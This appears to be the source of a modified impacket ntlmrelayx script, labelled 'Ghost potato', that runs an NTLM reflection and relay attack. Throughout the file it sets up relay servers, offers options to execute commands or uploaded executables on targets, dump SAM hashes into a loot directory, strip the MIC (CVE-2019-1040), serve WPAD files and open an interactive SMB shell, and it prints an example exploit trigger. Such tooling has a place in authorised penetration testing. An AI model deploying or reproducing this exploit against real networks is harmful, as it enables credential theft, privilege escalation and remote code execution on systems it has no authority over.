#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Generic NTLM Relay Module
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#             This module performs the SMB Relay attacks originally discovered
# by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
# It receives a list of targets and for every connection received it
# will choose the next target and try to relay the credentials. Also, if
# specified, it will first to try authenticate against the client connecting
# to us.
#
# It is implemented by invoking a SMB and HTTP Server, hooking to a few
# functions and then using the specific protocol clients (e.g. SMB, LDAP).
# It is supposed to be working on any LM Compatibility level. The only way
# to stop this attack is to enforce on the server SPN checks and or signing.
#
# If the authentication against the targets succeeds, the client authentication
# succeeds as well and a valid connection is set against the local smbserver.
# It's up to the user to set up the local smbserver functionality. One option
# is to set up shares with whatever files you want to so the victim thinks it's
# connected to a valid SMB server. All that is done through the smb.conf file or
# programmatically.
#

import argparse
import sys
import logging
import cmd
try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

import json
from threading import Thread

from impacket import version
from comm import logger
from comm.ntlmrelayx.servers import HTTPRelayServer
from comm.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS

RELAY_SERVERS = []

class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads):
        cmd.Cmd.__init__(self)

        self.prompt = 'ntlmrelayx> '
        self.tid = None
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())
        return

    def do_socks(self, line):
        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
        try:
            proxy_handler = ProxyHandler({})
            opener = build_opener(proxy_handler)
            response = Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception as e:
            logging.error("ERROR: %s" % str(e))
        else:
            if len(items) > 0:
                self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_startservers(self, line):
        if not self.serversRunning:
            start_servers(options, self.relayThreads)
            self.serversRunning = True
            logging.info('Relay servers started')
        else:
            logging.error('Relay servers are already running!')

    def do_stopservers(self, line):
        if self.serversRunning:
            stop_servers(self.relayThreads)
            self.serversRunning = False
            logging.info('Relay servers stopped')
        else:
            logging.error('Relay servers are already stopped!')

    def do_exit(self, line):
        print("Shutting down, please wait!")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)

def start_servers(options, threads):
    RELAY_SERVERS = [HTTPRelayServer]
    for server in RELAY_SERVERS:
        #Set up config
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setExeFile(options.e)
        c.setCommand(options.c)
        c.setEnumLocalAdmins(options.enum_local_admins)
        c.setEncoding(codec)
        c.setMode(mode)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir(options.lootdir)
        c.setOutputFile(options.output_file)
        c.setInteractive(options.interactive)
        c.setGPotatoStartUp(options.upload)
        c.setIPv6(options.ipv6)
        c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
        c.setSMB2Support(options.smb2support)
        c.setInterfaceIp(options.interface_ip)
        c.setExploitOptions(options.remove_mic, options.remove_target)
        c.setListeningPort(options.http_port)
        s = server(c)
        s.start()
        threads.add(s)
    return c

def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, RELAY_SERVERS):
            thread.server.shutdown()
            todelete.append(thread)
    # Now remove threads from the set
    for thread in todelete:
        threads.remove(thread)
        del thread

# Process command-line arguments.
if __name__ == '__main__':

    # Init the example's logger theme
    logger.init()
    logging.getLogger().setLevel(logging.INFO)
    #Parse arguments
    parser = argparse.ArgumentParser(add_help=False, description="Ghost potato")
    parser._optionals.title = "Main options"

    #Main arguments
    parser.add_argument("-h","--help", action="help", help='show this help message and exit')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient console instead'
                        'of executing a command after a successful relay. This console will listen locally on a '
                        ' tcp port and can be reached with for example netcat.')
    parser.add_argument('--upload', metavar='EXECUTABLE', default=None)

    # HTTPS options
    httpoptions = parser.add_argument_group("HTTP options")
    httpoptions.add_argument('-remove-target', action='store_true', default=False,
                             help='Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)')

    # Interface address specification
    parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP',
                        help='IP address of interface to '
                             'bind SMB and HTTP servers', default='')

    parser.add_argument('--http-port', type=int, help='Port to listen on http server', default=80)
    parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection (HTTP server only)')
    parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
                    'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
    parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
                                                                   'will be added for ntlm and ntlmv2')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/2.4/lib/standard-encodings.html and then execute ntlmrelayx.py '
                                                       'again with -codec and the corresponding codec ' % sys.getdefaultencoding())
    parser.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support (experimental!)')
    parser.add_argument('-wh','--wpad-host', action='store',help='Enable serving a WPAD file for Proxy Authentication attack, '
                                                                   'setting the proxy host to the one supplied.')
    parser.add_argument('-wa','--wpad-auth-num', action='store',help='Prompt for authentication N times for clients without MS16-077 installed '
                                                                   'before serving a WPAD file.')
    parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')
    parser.add_argument('--remove-mic', action='store_true',help='Remove MIC (exploit CVE-2019-1040)')

    # SMB arguments
    smboptions = parser.add_argument_group("SMB client options")

    smboptions.add_argument('-e', action='store', required=False, metavar='FILE',
                            help='File to execute on the target system. '
                                 'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
    smboptions.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND',
                            help='Command to execute on '
                                 'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
                                 'directory).')
    smboptions.add_argument('--enum-local-admins', action='store_true', required=False,
                            help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')

    options = parser.parse_args()
    # try:
    #    options = parser.parse_args()
    # except Exception as e:
    #    logging.error(str(e))
    #    sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    # Let's register the protocol clients we have
    # ToDo: Do this better somehow
    from comm.ntlmrelayx.clients import PROTOCOL_CLIENTS
    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS


    if options.codec is not None:
        codec = options.codec
    else:
        codec = sys.getdefaultencoding()

    mode = 'REFLECTION'
    logging.info("Running HTTP server in redirect mode")


    threads = set()
    c = start_servers(options, threads)

    print("")
    logging.info("Servers started, waiting for connections")
    print("[+] Exploit example: dir \\\\hostname@{}\\something".format(options.http_port))
    try:
        sys.stdin.read()
    except KeyboardInterrupt:
        logging.info("User exit..")
    for s in threads:
        del s

    sys.exit(0)
